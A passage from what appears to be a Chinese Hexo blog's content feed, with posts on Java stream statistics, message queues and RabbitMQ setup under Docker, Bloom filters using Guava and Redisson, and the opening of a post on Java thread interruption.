class="line">System.out.println(&quot;合并字符串: &quot; + mergedString);</span><br></pre></td></tr></table></figure><h4 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers &#x3D; Arrays.asList(3, 2, 2, 3, 7, 3, 5);</span><br><span class="line"> </span><br><span class="line">IntSummaryStatistics stats &#x3D; numbers.stream().mapToInt((x) -&gt; x).summaryStatistics();</span><br><span class="line"> </span><br><span class="line">System.out.println(&quot;列表中最大的数 : &quot; + stats.getMax());</span><br><span class="line">System.out.println(&quot;列表中最小的数 : &quot; + stats.getMin());</span><br><span class="line">System.out.println(&quot;所有数之和 : &quot; + stats.getSum());</span><br><span class="line">System.out.println(&quot;平均数 : &quot; + stats.getAverage());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javastream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javastream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列、RabbitMQ简介</title>
      <link href="/2020/12/20/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E3%80%81RabbitMQ%E7%AE%80%E4%BB%8B/"/>
      <url>/2020/12/20/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E3%80%81RabbitMQ%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="消息队列简介"><a href="#消息队列简介" class="headerlink" title="消息队列简介"></a>消息队列简介</h2><p>消息队列MQ(Message Queue)中间件是分布式系统中重要的组件，主要解决应用耦合，异步消息，流量削锋等问题实现高性能，高可用，可伸缩和终一致性,使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，RocketMQ.其中把数据放到消息队列叫做生产者，从消息队列里边取数据叫做消费者。</p><h2 id="消息队列的作用"><a href="#消息队列的作用" class="headerlink" title="消息队列的作用"></a>消息队列的作用</h2><p><strong>解耦：</strong> 假设有A、B2个系统，B系统需要调用A系统的接口，在一次更新后B不再需要调用A系统或者需要新的系统对接A呢么A系统的代码需要修改，这使得系统形成了关联耦合性，若将A系统的要发送的数据放入消息队列中，新的系统和原来的系统只需要修改消费消息队列数据的代码即可，实现了解耦，如下图。通俗点说，可以将消息队列想象成蜂巢快递柜，快递员(系统A)和用户(系统B)不关心找不找到对的彼此和位置，快递员只需要将快递(消息数据)放到蜂巢柜(消息队列)等待用户去取(消费)即可。<br><img src="/img/MQ/mq_1.png" alt="解耦"><br><img src="/img/MQ/mq_2.png" alt="解耦"></p><p><strong>异步与流量削锋：</strong> 当我们不使⽤消息队列的时候，所有的⽤户的请求会直接落到服务器，然后通过数据库或者缓存响应。假如在⾼并发的场景下，如果没有缓存或者数据库承受不了这么⼤的压⼒的话，就会造成响应速度缓慢，甚⾄造成数据库宕机。但是，在使⽤消息队列之后，⽤户的请求数据发送给了消息队列之后就可以⽴即返回，再由消息队列的消费者进程从消息队列中获取数据，异步写⼊数据库，不过要确保消息不被重复消费还要考虑到消息丢失问题。由于消息队列服务器处理速度快于数据库，因此响应速度得到⼤幅改善。简而言之异步即服务读取消息队列数据的速度远高于数据库所以分布式形式的多个服务消费处理消息队列的数据可以提供系统响应速度，削峰即未使用消息队列和缓存之前所有用户的请求即是数据库、服务器的压力，使用消息队列后可以控制将大部分的请求暂存到消息队列中避免服务器突然处理过多的请求。如下图：<br><img src="/img/MQ/mq_3.png" alt="异步，削峰"></p><h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>RabbitMQ 是一个由 Erlang 语言开发的 AMQP 的开源实现。<br>AMQP ：Advanced Message Queue，高级消息队列协议。它是应用层协议的一个开放 标准，为面向消息的中间件设计，基于此协议的客户端与消息中间件可传递消息，并不 受产品、开发语言等条件的限制。<br>RabbitMQ 初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展 性、高可用性等方面表现不俗。具体特点包括：<br>1.可靠性（Reliability）<br>RabbitMQ 使用一些机制来保证可靠性，如持久化、传输确认、发布确认。<br>2.灵活的路由（Flexible Routing）<br>在消息进入队列之前，通过 Exchange 来路由消息的。对于典型的路由功能，RabbitMQ 已经提供了一些内置的 Exchange 来实现。针对更复杂的路由功能，可以将多个 Exchange 绑定在一起，也通过插件机制实现自己的 Exchange 。<br>3.消息集群（Clustering）<br>多个 RabbitMQ 服务器可以组成一个集群，形成一个逻辑 Broker 。 4.高可用（Highly Available Queues）<br>队列可以在集群中的机器上进行镜像，使得在部分节点出问题的情况下队列仍然可用。<br>5.多种协议（Multi-protocol）<br>RabbitMQ 支持多种消息队列协议，比如 STOMP、MQTT 等等。<br>6.多语言客户端（Many Clients） RabbitMQ 几乎支持所有常用语言，比如 Java、.NET、Ruby 等等。<br>7.管理界面（Management UI）<br>RabbitMQ 提供了一个易用的用户界面，使得用户可以监控和管理消息 Broker 的许多方 面。<br>8.跟踪机制（Tracing）<br>如果消息异常，RabbitMQ 提供了消息跟踪机制，使用者可以找出发生了什么。 9.插件机制（Plugin System）<br>RabbitMQ 提供了许多插件，来从多方面进行扩展，也可以编写自己的插件。 </p><h3 id="RabbitMQ架构图"><a href="#RabbitMQ架构图" class="headerlink" title="RabbitMQ架构图"></a>RabbitMQ架构图</h3><p><img src="/img/MQ/rabbitmq_1.png" alt="RabbitMQ架构图"></p><h3 id="RabbitMQ主要概念"><a href="#RabbitMQ主要概念" class="headerlink" title="RabbitMQ主要概念"></a>RabbitMQ主要概念</h3><p>RabbitMQ Server： 也叫broker server，它是一种传输服务。 他的角色就是维护一条 从Producer到Consumer的路线，保证数据能够按照指定的方式进行传输。<br>Producer： 消息生产者，如图A、B、C，数据的发送方。消息生产者连接RabbitMQ服 务器然后将消息投递到Exchange。<br>Consumer：消息消费者，如图1、2、3，数据的接收方。消息消费者订阅队列， RabbitMQ将Queue中的消息发送到消息消费者。 Exchange：生产者将消息发送到Exchange（交换器），由Exchange将消息路由到一个 或多个Queue中（或者丢弃）。Exchange并不存储消息。RabbitMQ中的Exchange有 direct、fanout、topic、headers四种类型，每种类型对应不同的路由规则。<br>Queue：（队列）是RabbitMQ的内部对象，用于存储消息。消息消费者就是通过订阅 队列来获取消息的，RabbitMQ中的消息都只能存储在Queue中，生产者生产消息并终 投递到Queue中，消费者可以从Queue中获取消息并消费。多个消费者可以订阅同一个 Queue，这时Queue中的消息会被平均分摊给多个消费者进行处理，而不是每个消费者 都收到所有的消息并处理。<br>RoutingKey：生产者在将消息发送给Exchange的时候，一般会指定一个routing key， 来指定这个消息的路由规则，而这个routing key需要与Exchange Type及binding key联 合使用才能终生效。在Exchange Type与binding key固定的情况下（在正常使用时一 般这些内容都是固定配置好的），我们的生产者就可以在发送消息给Exchange时，通过 指定routing key来决定消息流向哪里。RabbitMQ为routing key设定的长度限制为255 bytes。<br>Connection： （连接）：Producer和Consumer都是通过TCP连接到RabbitMQ Server 的。以后我们可以看到，程序的起始处就是建立这个TCP连接。<br>Channels： （信道）：它建立在上述的TCP连接中。数据流动都是在Channel中进行 的。也就是说，一般情况是程序起始建立TCP连接，第二步就是建立这个Channel。<br>VirtualHost：权限控制的基本单位，一个VirtualHost里面有若干Exchange和 MessageQueue，以及指定被哪些user使用 </p><h3 id="docker环境下安装RabbitMQ"><a href="#docker环境下安装RabbitMQ" class="headerlink" title="docker环境下安装RabbitMQ"></a>docker环境下安装RabbitMQ</h3><p>(1)下载镜像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull rabbitmq:management</span><br></pre></td></tr></table></figure><br>(2)创建容器，rabbitmq需要有映射以下端口:  5671   5672  4369  15671   15672   25672 </p><ul><li>15672 (if management plugin is enabled) </li><li>15671  management监听端口</li><li>5672, 5671 (AMQP 0-9-1 without and with TLS) </li><li>4369 (epmd)   epmd  代表 Erlang 端口映射守护进程 </li><li>25672 (Erlang distribution)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run ‐di ‐‐name&#x3D;rabbitmq ‐p 5671:5617 ‐p 5672:5672 ‐p  4369:4369 ‐p 15671:15671 ‐p 15672:15672 ‐p 25672:25672 rabbitmq:management</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> rabbitmq </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布隆过滤器</title>
      <link href="/2020/12/11/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2020/12/11/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="布隆过滤器的优缺点概述"><a href="#布隆过滤器的优缺点概述" class="headerlink" title="布隆过滤器的优缺点概述"></a>布隆过滤器的优缺点概述</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul><li><p>由于存储的是二进制数据，所以占用的空间很小</p></li><li><p>它的插入和查询速度是非常快的，时间复杂度是O（K），可以联想一下HashMap的过程</p></li><li><p>保密性很好，因为本身不存储任何原始数据，只有二进制数据</p></li></ul><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul><li><p>存在误判，详细说明与例子见上文布隆器基础介绍部分。</p></li><li><p>删除困难，试想布隆过滤器存入的几个数据经过计算的hash值相同，那么他们的二进制数组下标也一定相同，删除后导致与业务不相符的逻辑——删除了不应删除的hash值相同的数据。</p></li></ul><h3 id="布隆过滤器实现"><a href="#布隆过滤器实现" class="headerlink" title="布隆过滤器实现"></a>布隆过滤器实现</h3><h4 id="google-guava工具类实现"><a href="#google-guava工具类实现" class="headerlink" title="google.guava工具类实现"></a>google.guava工具类实现</h4><h5 id="demo理解"><a href="#demo理解" class="headerlink" title="demo理解"></a>demo理解</h5><ol><li><p>引入Guava pom配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>29.0-jre<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>代码实现(demo版)</p></li></ol><p>向布隆过滤器中插入100万个数据，使用bloomFilter.mightContain方法判断再添加数据会出现下标重合的误判。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.common.hash.BloomFilter;</span><br><span class="line"><span class="keyword">import</span> com.google.common.hash.Funnels;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BloomFilterCase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 预计要插入多少数据</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> size = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 期望的误判率</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">double</span> fpp = <span class="number">0.01</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 布隆过滤器</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size, fpp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 插入10万样本数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">      bloomFilter.put(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用另外十万测试数据，测试误判率</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = size; i &lt; size + <span class="number">100000</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (bloomFilter.mightContain(i)) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        System.out.println(i + <span class="string">"误判了"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"总共的误判数:"</span> + count);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>运行结果</li></ol><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201221134211518.png" alt="image-20201221134211518"></p><p>10万数据里有947个误判，约等于0.01%，也就是我们代码里设置的误判率：fpp = 0.01。</p><ol><li>核心源码分析(guava  29.0-jre 版本)</li></ol><p><strong>创建布隆过滤器</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">BloomFilter&lt;T&gt; <span class="title">create</span><span class="params">(Funnel&lt;? <span class="keyword">super</span> T&gt; funnel, <span class="keyword">int</span> expectedInsertions, <span class="keyword">double</span> fpp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> create(funnel, (<span class="keyword">long</span>)expectedInsertions, fpp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">BloomFilter&lt;T&gt; <span class="title">create</span><span class="params">(Funnel&lt;? <span class="keyword">super</span> T&gt; funnel, <span class="keyword">long</span> expectedInsertions, <span class="keyword">double</span> fpp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> create(funnel, expectedInsertions, fpp, BloomFilterStrategies.MURMUR128_MITZ_64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@VisibleForTesting</span></span><br><span class="line">    <span class="keyword">static</span> &lt;T&gt; <span class="function">BloomFilter&lt;T&gt; <span class="title">create</span><span class="params">(Funnel&lt;? <span class="keyword">super</span> T&gt; funnel, <span class="keyword">long</span> expectedInsertions, <span class="keyword">double</span> fpp, BloomFilter.Strategy strategy)</span> </span>&#123;</span><br><span class="line">        Preconditions.checkNotNull(funnel);</span><br><span class="line">        Preconditions.checkArgument(expectedInsertions &gt;= <span class="number">0L</span>, <span class="string">"Expected insertions (%s) must be &gt;= 0"</span>, expectedInsertions);</span><br><span class="line">        Preconditions.checkArgument(fpp &gt; <span class="number">0.0</span>D, <span class="string">"False positive probability (%s) must be &gt; 0.0"</span>, fpp);</span><br><span class="line">        Preconditions.checkArgument(fpp &lt; <span class="number">1.0</span>D, <span class="string">"False positive probability (%s) must be &lt; 1.0"</span>, fpp);</span><br><span class="line">        Preconditions.checkNotNull(strategy);</span><br><span class="line">        <span class="keyword">if</span> (expectedInsertions == <span class="number">0L</span>) &#123;</span><br><span class="line">            expectedInsertions = <span class="number">1L</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> numBits = optimalNumOfBits(expectedInsertions, fpp);</span><br><span class="line">        <span class="keyword">int</span> numHashFunctions = optimalNumOfHashFunctions(expectedInsertions, numBits);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> BloomFilter(<span class="keyword">new</span> LockFreeBitArray(numBits), numHashFunctions, funnel, strategy);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Could not create BloomFilter of "</span> + numBits + <span class="string">" bits"</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所需参数：</p><ul><li><code>funnel</code>：数据类型(一般是调用Funnels工具类中的)</li><li><code>expectedInsertions</code>：期望插入的值的个数</li><li><code>fpp</code>：误判率(默认值为0.03)</li><li><code>strategy</code>：哈希算法</li></ul><p><strong>参数fpp误判率与所占内存</strong></p><p><strong>情景一：fpp = 0.01</strong></p><ul><li>误判个数： 947</li></ul><p><img src="C:\Users\admin\Desktop\blog\fpp001.jpg" alt="fpp001"></p><ul><li>占内存大小</li></ul><p><img src="C:\Users\admin\Desktop\blog\fpp001bites.jpg" alt="fpp001bites"></p><p><strong>情景二：fpp=0.03</strong></p><ul><li>误判个数：</li></ul><p><img src="C:\Users\admin\Desktop\blog\fp003.jpg" alt="fp003"></p><ul><li>占内存大小</li></ul><p><img src="C:\Users\admin\Desktop\blog\fpp003bites.jpg" alt="fpp003bites"></p><p><strong>情景总结</strong></p><ul><li>误判率可以通过<code>fpp</code>参数进行调节</li><li>fpp越小，需要的内存空间就越大：0.01需要900多万位数，0.03需要700多万位数。</li><li>fpp越小，集合添加数据时，就需要更多的hash函数运算更多的hash值，去存储到对应的数组下标里。（忘了去看上面的布隆过滤存入数据的过程）</li></ul><p>上面的<code>numBits</code>，表示存一百万个int类型数字，需要的位数为7298440，700多万位。理论上存一百万个数，一个int是4字节32位，需要481000000=3200万位。如果使用HashMap去存，按HashMap50%的存储效率，需要6400万位。可以看出BloomFilter的存储空间很小，只有HashMap的1/10左右</p><p>上面的<code>numHashFunctions</code>表示需要几个hash函数运算，去映射不同的下标存这些数字是否存在（0 or 1）。</p><p>布隆过滤器中添加、判断是否误判方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> BloomFilterStrategies implements Strategy &#123;</span><br><span class="line">MURMUR128_MITZ_64 &#123;</span><br><span class="line">        <span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">put</span><span class="params">(T object, Funnel&lt;? <span class="keyword">super</span> T&gt; funnel, <span class="keyword">int</span> numHashFunctions, BloomFilterStrategies.LockFreeBitArray bits)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">long</span> bitSize = bits.bitSize();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();</span><br><span class="line">            <span class="keyword">long</span> hash1 = <span class="keyword">this</span>.lowerEight(bytes);</span><br><span class="line">            <span class="keyword">long</span> hash2 = <span class="keyword">this</span>.upperEight(bytes);</span><br><span class="line">            <span class="keyword">boolean</span> bitsChanged = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">long</span> combinedHash = hash1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numHashFunctions; ++i) &#123;</span><br><span class="line">                bitsChanged |= bits.set((combinedHash &amp; <span class="number">9223372036854775807L</span>) % bitSize);</span><br><span class="line">                combinedHash += hash2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bitsChanged;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">mightContain</span><span class="params">(T object, Funnel&lt;? <span class="keyword">super</span> T&gt; funnel, <span class="keyword">int</span> numHashFunctions, BloomFilterStrategies.LockFreeBitArray bits)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">long</span> bitSize = bits.bitSize();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();</span><br><span class="line">            <span class="keyword">long</span> hash1 = <span class="keyword">this</span>.lowerEight(bytes);</span><br><span class="line">            <span class="keyword">long</span> hash2 = <span class="keyword">this</span>.upperEight(bytes);</span><br><span class="line">            <span class="keyword">long</span> combinedHash = hash1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numHashFunctions; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!bits.get((combinedHash &amp; <span class="number">9223372036854775807L</span>) % bitSize)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                combinedHash += hash2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure><h4 id="Redis实现"><a href="#Redis实现" class="headerlink" title="Redis实现"></a>Redis实现</h4><p>上面使用Guava实现的布隆过滤器是把数据放在了本地内存中。分布式的场景中就不合适了，无法共享内存。<br>我们还可以用Redis来实现布隆过滤器，这里使用Redis封装好的客户端工具Redisson。<br>其底层是使用数据结构bitMap</p><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><ol><li><p>导入配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.redisson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.13.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>java代码</p></li></ol><p>guava工具类使用mightContain()判断是否存在，可在访问要求查缓存前查询缓存是否存在，避免缓存穿透。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedissonBloomFilter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Config config = <span class="keyword">new</span> Config();</span><br><span class="line">    config.useSingleServer().setAddress(<span class="string">"redis://127.0.0.1:6379"</span>);</span><br><span class="line">    config.useSingleServer().setPassword(<span class="string">"1234"</span>);</span><br><span class="line">    <span class="comment">//构造Redisson</span></span><br><span class="line">    RedissonClient redisson = Redisson.create(config);</span><br><span class="line"></span><br><span class="line">    RBloomFilter&lt;String&gt; bloomFilter = redisson.getBloomFilter(<span class="string">"phoneList"</span>);</span><br><span class="line">    <span class="comment">//初始化布隆过滤器：预计元素为100000000L,误差率为3%</span></span><br><span class="line">    bloomFilter.tryInit(<span class="number">100000000L</span>,<span class="number">0.03</span>);</span><br><span class="line">    <span class="comment">//将号码10086插入到布隆过滤器中</span></span><br><span class="line">    bloomFilter.add(<span class="string">"10086"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断下面号码是否在布隆过滤器中</span></span><br><span class="line">    <span class="comment">//输出false</span></span><br><span class="line">    System.out.println(bloomFilter.contains(<span class="string">"123456"</span>));</span><br><span class="line">    <span class="comment">//输出true</span></span><br><span class="line">    System.out.println(bloomFilter.contains(<span class="string">"10086"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 布隆过滤器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 布隆过滤器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见Java并发中断相关方法</title>
      <link href="/2020/11/26/%E5%B8%B8%E8%A7%81Java%E5%B9%B6%E5%8F%91%E4%B8%AD%E6%96%AD%E6%96%B9%E6%B3%95/"/>
      <url>/2020/11/26/%E5%B8%B8%E8%A7%81Java%E5%B9%B6%E5%8F%91%E4%B8%AD%E6%96%AD%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在极客时间学习09Java线程的生命周期(上)时，课后思考出现了本文没有介绍的isInterrupted()方法，特此记录学习Java并发中断方法。</p><h2 id="中断介绍"><a href="#中断介绍" class="headerlink" title="中断介绍"></a>中断介绍</h2><p>并发编程引用了中断机制无疑证明了中断对多线程并发的裨益，想想死锁的四个条件：互斥、请求与保持、环路等待、不可抢占。中断可以完美的破坏请求与保持、环路等待的死锁条件。再比如有的线程可能迷失在怪圈无法自拔（自旋浪费资源），这时就可以用其他线程在恰当的时机给它个中断通知，被“中断”的线程可以选择在恰当的时机选择跳出怪圈，最大化的利用资源。</p><p>了解Thread类中断方法之前我们先了解一下中断标识，Java 的每个线程对象里都有一个 boolean 类型的标识，代表是否有中断请求，注：这个标识通过底层 native 方法实现的。</p><h2 id="中断相关方法"><a href="#中断相关方法" class="headerlink" title="中断相关方法"></a>中断相关方法</h2><p>先上源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 